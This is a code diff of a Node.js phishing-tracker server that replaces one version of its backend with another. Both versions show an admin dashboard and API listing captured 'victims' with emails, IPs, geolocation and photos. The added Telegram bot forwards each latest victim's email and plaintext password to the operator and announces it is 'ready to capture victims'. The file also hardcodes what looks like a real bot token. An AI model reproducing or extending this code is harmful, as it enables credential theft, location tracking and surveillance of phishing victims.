-    if (token !== CONFIG.SECRET_KEY.substring(0, 32)) {
-        return res.status(403).send('Access denied');
-    }
-    
-    const stats = db.getStatistics();
-    const victims = db.getAllVictims().slice(0, 50);
-    
-    res.send(`
-<!DOCTYPE html>
-<html>
-<head>
-    <title>Admin Dashboard</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <style>
-        body { font-family: monospace; background: #0f0f0f; color: #0f0; margin: 0; padding: 20px; }
-        .container { max-width: 1200px; margin: 0 auto; }
-        .header { background: #1a1a1a; padding: 20px; border-radius: 10px; margin-bottom: 20px; }
-        .stats-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px; margin: 20px 0; }
-        .stat-card { background: #1a1a1a; padding: 20px; border-radius: 10px; border-left: 4px solid #0f0; }
-        .stat-value { font-size: 2em; font-weight: bold; color: #0f0; }
-        table { width: 100%; border-collapse: collapse; background: #1a1a1a; margin: 20px 0; }
-        th, td { padding: 12px; text-align: left; border-bottom: 1px solid #333; }
-        th { background: #222; }
-        .export-btn { background: #0f0; color: #000; border: none; padding: 10px 20px; border-radius: 5px; cursor: pointer; margin: 10px; }
-        .map-link { color: #0ff; text-decoration: none; }
-    </style>
-</head>
-<body>
-    <div class="container">
-        <div class="header">
-            <h1>🕵️‍♂️ PHISHING TRACKER ADMIN v2</h1>
-            <p>Total Victims: ${stats.total} | Today: ${stats.today}</p>
-            <button class="export-btn" onclick="exportData()">📥 Export JSON</button>
-            <button class="export-btn" onclick="location.reload()">🔄 Refresh</button>
-        </div>
-        
-        <div class="stats-grid">
-            <div class="stat-card">
-                <div class="stat-value">${stats.total}</div>
-                <div>Total Victims</div>
-            </div>
-            <div class="stat-card">
-                <div class="stat-value">${stats.today}</div>
-                <div>Today</div>
-            </div>
-            <div class="stat-card">
-                <div class="stat-value">${stats.withLocation}</div>
-                <div>With Location</div>
-            </div>
-            <div class="stat-card">
-                <div class="stat-value">${stats.withPhoto}</div>
-                <div>With Photos</div>
-            </div>
-        </div>
-        
-        <h2>Recent Victims</h2>
-        <table>
-            <thead>
-                <tr>
-                    <th>ID</th>
-                    <th>Email</th>
-                    <th>IP</th>
-                    <th>Location</th>
-                    <th>Time</th>
-                    <th>Actions</th>
-                </tr>
-            </thead>
-            <tbody>
-                ${victims.map(v => `
-                <tr>
-                    <td><small>${v.id}</small></td>
-                    <td><strong>${v.credentials?.email || 'N/A'}</strong></td>
-                    <td><code>${v.ip}</code></td>
-                    <td>
-                        ${v.geolocation ? `
-                        ${v.geolocation.city || ''} ${v.geolocation.country || ''}
-                        ${v.maps ? `<br><a href="${v.maps.google}" target="_blank" class="map-link">🗺️ Map</a>` : ''}
-                        ` : 'No location'}
-                    </td>
-                    <td><small>${moment(v.timestamp).format('HH:mm:ss')}</small></td>
-                    <td>
-                        <button onclick="viewVictim('${v.id}')">👁️ View</button>
-                    </td>
-                </tr>
-                `).join('')}
-            </tbody>
-        </table>
-    </div>
-    
-    <script>
-        function exportData() {
-            const data = ${JSON.stringify(victims, null, 2)};
-            const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
-            const url = URL.createObjectURL(blob);
-            const a = document.createElement('a');
-            a.href = url;
-            a.download = 'victims_export_' + new Date().toISOString() + '.json';
-            document.body.appendChild(a);
-            a.click();
-            document.body.removeChild(a);
-        }
-        
-        function viewVictim(id) {
-            alert('Victim ID: ' + id + '\\nView in console for details.');
-            console.log('Victim data:', ${JSON.stringify(victims.find(v => v.id))});
-        }
-        
-        // Auto-refresh every 30 seconds
-        setTimeout(() => location.reload(), 30000);
-    </script>
-</body>
-</html>
-    `);
-});
-
-// API for victim data
-app.get('/api/victims', (req, res) => {
-    const { token, limit } = req.query;
-    
-    if (token !== CONFIG.SECRET_KEY.substring(0, 32)) {
-        return res.status(403).json({ error: 'Unauthorized' });
-    }
-    
-    const victims = db.getAllVictims();
-    const limited = limit ? victims.slice(0, parseInt(limit)) : victims;
+    const victimsList = Array.from(victims.values()).map(v => ({
+        id: v.victimId,
+        email: v.credentials.email,
+        ip: v.ip,
+        location: v.location ? 'Yes' : 'No',
+        photo: v.photo ? 'Yes' : 'No',
+        time: v.timestamp,
+        country: v.geolocation?.country || 'Unknown'
+    }));
     
     res.json({
-        success: true,
-        count: limited.length,
-        total: victims.length,
-        victims: limited
+        total: victims.size,
+        victims: victimsList,
+        stats: {
+            withLocation: victimsList.filter(v => v.location === 'Yes').length,
+            withPhoto: victimsList.filter(v => v.photo === 'Yes').length,
+            uniqueCountries: [...new Set(victimsList.map(v => v.country))].length
+        }
     });
 });
 
-// ==================== START SERVER ====================
+// Generate victim ID
+function generateVictimId(req) {
+    const ip = req.ip || req.connection.remoteAddress || req.socket.remoteAddress;
+    const userAgent = req.headers['user-agent'] || '';
+    const timestamp = Date.now();
+    
+    return crypto
+        .createHash('sha256')
+        .update(ip + userAgent + timestamp)
+        .digest('hex')
+        .substring(0, 12);
+}
+
+// Bot commands handler
+if (TELEGRAM_BOT_TOKEN && TELEGRAM_BOT_TOKEN !== '8550434238:AAECMid6pXeBoLCdySDfd_2hXkWEMBfjI8s') {
+    bot.onText(/\/start/, (msg) => {
+        bot.sendMessage(msg.chat.id, `
+🕵️ *Phishing Tracker Bot* 🕵️
+
+*Commands:*
+/victims - List all captured victims
+/stats - Show tracking statistics
+/latest - Show latest victim details
+/help - Show this help message
+
+*Automatic alerts* will be sent when new victims are captured.
+        `, { parse_mode: 'Markdown' });
+    });
+    
+    bot.onText(/\/victims/, (msg) => {
+        const victimsList = Array.from(victims.values())
+            .slice(-10) // Last 10 victims
+            .map((v, i) => 
+                `${i+1}. ${v.credentials.email} (${v.ip}) - ${moment(v.timestamp).fromNow()}`
+            )
+            .join('\n');
+        
+        bot.sendMessage(msg.chat.id, 
+            `*Last 10 Victims:*\n\n${victimsList || 'No victims yet'}`,
+            { parse_mode: 'Markdown' }
+        );
+    });
+    
+    bot.onText(/\/stats/, (msg) => {
+        const stats = {
+            total: victims.size,
+            today: Array.from(victims.values()).filter(v => 
+                moment(v.timestamp).isSame(moment(), 'day')
+            ).length,
+            withLocation: Array.from(victims.values()).filter(v => v.location).length,
+            withPhoto: Array.from(victims.values()).filter(v => v.photo).length
+        };
+        
+        bot.sendMessage(msg.chat.id, 
+            `*Tracking Statistics:*\n\n` +
+            `👥 Total Victims: ${stats.total}\n` +
+            `📅 Today: ${stats.today}\n` +
+            `📍 With Location: ${stats.withLocation}\n` +
+            `📸 With Photos: ${stats.withPhoto}`,
+            { parse_mode: 'Markdown' }
+        );
+    });
+    
+    bot.onText(/\/latest/, (msg) => {
+        const latest = Array.from(victims.values()).pop();
+        if (latest) {
+            const summary = `
+*Latest Victim Summary:*
+
+👤 Email: ${latest.credentials.email}
+🔑 Password: \`${latest.credentials.password}\`
+🌐 IP: ${latest.ip}
+📍 Location: ${latest.location ? 'Yes' : 'No'}
+📸 Photo: ${latest.photo ? 'Yes' : 'No'}
+⏰ Time: ${moment(latest.timestamp).format('YYYY-MM-DD HH:mm:ss')}
+            `;
+            bot.sendMessage(msg.chat.id, summary, { parse_mode: 'Markdown' });
+        } else {
+            bot.sendMessage(msg.chat.id, 'No victims captured yet.');
+        }
+    });
+}
+
+// Start server
 app.listen(PORT, () => {
     console.log(`
-╔══════════════════════════════════════════════════════════╗
-║                ULTIMATE PHISHING TRACKER v2             ║
-╠══════════════════════════════════════════════════════════╣
-║                                                          ║
-║  🌐 URL: ${CONFIG.DOMAIN.padEnd(40)} ║
-║  🔒 PORT: ${PORT.toString().padEnd(39)} ║
-║  🛡️ SECURITY: Enhanced Stealth Mode               ║
-║  💾 DATABASE: AES-256 Encrypted                    ║
-║  📡 TELEGRAM: ${telegramBot.bot ? '✅ Connected' : '❌ Disabled'.padEnd(30)} ║
-║  📊 VICTIMS: ${db.stats.totalVictims.toString().padEnd(37)} ║
-║                                                          ║
-║  📍 Features:                                          ║
-║  • GPS Location Tracking                               ║
-║  • Facial Recognition                                  ║
-║  • Device Fingerprinting                               ║
-║  • Network Analysis                                    ║
-║  • Real-time Telegram Alerts                           ║
-║  • Encrypted Database                                  ║
-║  • Anti-DNS Detection                                  ║
-║  • Rate Limiting                                       ║
-║  • IP Blocking                                         ║
-║                                                          ║
-╚══════════════════════════════════════════════════════════╝
+╔══════════════════════════════════════════════════════╗
+║       🕵️ ADVANCED PHISHING TRACKER ONLINE       ║
+╠══════════════════════════════════════════════════════╣
+║                                                      ║
+║  🔗 URL: http://localhost:${PORT}                    ║
+║  📊 Port: ${PORT}                                    ║
+║  🤖 Telegram: ${TELEGRAM_BOT_TOKEN ? '✅ Connected' : '❌ Not Configured'} ║
+║  💾 Storage: In-memory database                     ║
+║                                                      ║
+║  📁 Logs saved to: ./logs/                          ║
+║  📸 Photos saved: Yes                               ║
+║  📍 Location tracking: Yes                          ║
+║  🔍 Device fingerprinting: Yes                      ║
+║                                                      ║
+╚══════════════════════════════════════════════════════╝
     `);
     
-    // Start hourly reports
-    setInterval(() => telegramBot.sendHourlyReport(), 60 * 60 * 1000);
+    // Send startup message to Telegram
+    if (TELEGRAM_BOT_TOKEN && TELEGRAM_BOT_TOKEN !== '8550434238:AAECMid6pXeBoLCdySDfd_2hXkWEMBfjI8s') {
+        bot.sendMessage(TELEGRAM_CHAT_ID, 
+            `✅ *Phishing Tracker Started*\n\n` +
+            `🌐 Server: ${DOMAIN}\n` +
+            `🕐 Time: ${moment().format('YYYY-MM-DD HH:mm:ss')}\n` +
+            `📊 Ready to capture victims.`,
+            { parse_mode: 'Markdown' }
+        );
+    }
 });
 
-// For Vercel deployment
-module.exports = app;
+// Package.json dependencies
+/*
+{
+  "name": "advanced-phishing-tracker",
+  "version": "1.0.0",
+  "main": "server.js",
+  "scripts": {
+    "start": "node server.js"
+  },
+  "dependencies": {
+    "express": "^4.18.2",
+    "node-telegram-bot-api": "^0.61.0",
+    "geoip-lite": "^1.4.7",
+    "moment": "^2.29.4"
+  }
+}
+*/
